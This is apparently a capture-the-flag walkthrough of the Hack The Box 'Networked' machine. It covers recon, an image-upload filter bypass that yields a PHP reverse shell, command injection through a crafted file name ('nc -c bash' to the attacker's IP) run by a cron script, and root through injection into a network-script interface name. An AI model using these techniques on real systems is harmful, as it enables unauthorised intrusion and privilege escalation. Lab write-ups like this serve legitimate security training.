# recon
## pymap.py 
```
PORT    STATE  SERVICE VERSION
443/tcp closed https


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
3 opens port.
- 22: OpenSSH 7.4 (protocol 2.0)
- 80: Apache httpd 2.4.6 ((CentOS) **PHP**/5.4.16)
- 443: closed
## web
gobuster `-x php`
```
/backup (Status: 301)
/cgi-bin/ (Status: 403)
/index.php (Status: 200)
/lib.php (Status: 200)
/photos.php (Status: 200)
/upload.php (Status: 200)
/uploads (Status: 301)
```
- index.php : `<!-- upload and gallery not yet linked -->`
`backup` looks juicy!!. let check it out.
- /backup : backup.tar
- /upload.php : can upload file, tested with .txt give a **error**: `Invalid image file.`. Seem like it only allow upload images.
- /photo.php : list all photo on the server
- /uploads/<name> : get photo on the server

lets download `backup.tar`
```console
┌──(kali㉿kali)-[~/HTB/networked]
└─$ tar -xvf backup.tar                                                         2 ⨯
index.php
lib.php
photos.php
upload.php
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked]
└─$ ls
backup.tar  index.php  lib.php  photos.php  test.txt  upload.php
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked]
└─$ mkdir web && mv *.php web && cd web          
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked/web]
└─$ ls
index.php  lib.php  photos.php  upload.php
```
seem like this is the source code of the web app. Let's check it out so we understand our target better.
### src code

- upload.php
```php
  if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }
.
.
.
.
list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
```
Something to note that is:
- 1st error message occur when. if medthod call `check_file_type` return fail and file is bigger that 6000. 
- 2nd error message occur when the is not end with `'.jpg', '.png', '.gif', '.jpeg'`

now let check `check_file_type`
```console
┌──(kali㉿kali)-[~/HTB/networked/web]
└─$ grep 'check_file_type' *.php                  
lib.php:function check_file_type($file) {
upload.php:    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
```
okey let check `lib.php`
```php
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
.
.
.
function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
.
.
.
```
The interesting part is `FILEINFO_MIME` if the `FILEINFO_MIME` return `image` then we can upload the file. I googled a bit about `FILEINFO_MIME` to confirm that my assumesion is correct, read [here](https://www.php.net/manual/en/function.finfo-file.php). 


The plan is try to fool the web app that we upload a image file by adding a magic byte to our payload. This will bypass the 1st check. Also our payload need to end with `'.jpg', '.png', '.gif', '.jpeg'` to bypass the 2nd check. Let's try it out.
```console
──(kali㉿kali)-[~/HTB/networked]
└─$ echo "GIF87a" > test.txt      
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked]
└─$ file test.txt 
test.txt: GIF image data, version 87a,
```
okey looks good, now let craft some php code and try out
```console
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked]
└─$ echo "GIF87a;<?php echo'kurohat was here' ?>" > kuro.php.gif
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked]
└─$ file kuro.php.gif 
kuro.php.gif: GIF image data, version 87a, 15419 x 28735                                                                 
```
now visite `/photos.php` to get the file name and visite `/uploads/<filename>` to get the file, and it works!!! 


## foot hold
now let upload a reverse shell using the same method that we use before.
```console
┌──(kali㉿kali)-[~/HTB/networked]
└─$ file cutiecat.php   # payload with GIF87a; at the begining
cutiecat.php: GIF image data, version 87a, 15419 x 28735
                                                                                    
┌──(kali㉿kali)-[~/HTB/networked]
└─$ mv cutiecat.php cutiecat.php.gif   
```
now upload it and repeat the same process and before + open netcat listen to incoming reverse shell
```
$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.146] 40230
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:25:52 up  3:02,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$
```
let recon
```
sh-4.2$ ls -la home/guly
ls -la home/guly
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```
- corntab.guly
```
sh-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
executing /check_attack.php each 3 min
- check_attack.php
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
## user

the script is checking for an malicoius file at `/var/www/html/uploads/` by using `scandir` which return list of files name (array) in the directory. If there are a malicoius file, an eamil is send to alert *Guly*. There are 1 varible that we can manipulate it, which is `$value`. 

`$value` is a file name from `/var/www/html/uploads/`. Note that `$value` is passed to `exec()`, `exec()` is use to execute command on the system which mean we can fool the system by create a file with a malicoius bash code as a file name. Note that the file name cannot incloude `/` so I decided to use `nc -c bash 10.10.14.43 9696`
```console
$ touch -- ";nc -c bash 10.10.14.43 9696;.php"
```
on kali
```console
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ nc -nlvp 9696                                                                                                    1 ⨯
listening on [any] 9696 ...

connect to [10.10.14.43] from (UNKNOWN) [10.10.10.146] 43712
whoami
guly
python -c "import pty; pty.spawn('/bin/bash')"
[guly@networked ~]$ ^Z
[1]+  Stopped                 nc -nlvp 9696
[10.10.14.43]-kali@kali:~$ stty raw -echo;fg
nc -nlvp 9696
             export TERM=xterm
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

# root
```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
- google `network-scripts privilege escalation`
- https://bugzilla.redhat.com/show_bug.cgi?id=1697473
```console
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
kurohat bash
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
yest
interface BOOTPROTO:
test
[root@networked network-scripts]#
```
boom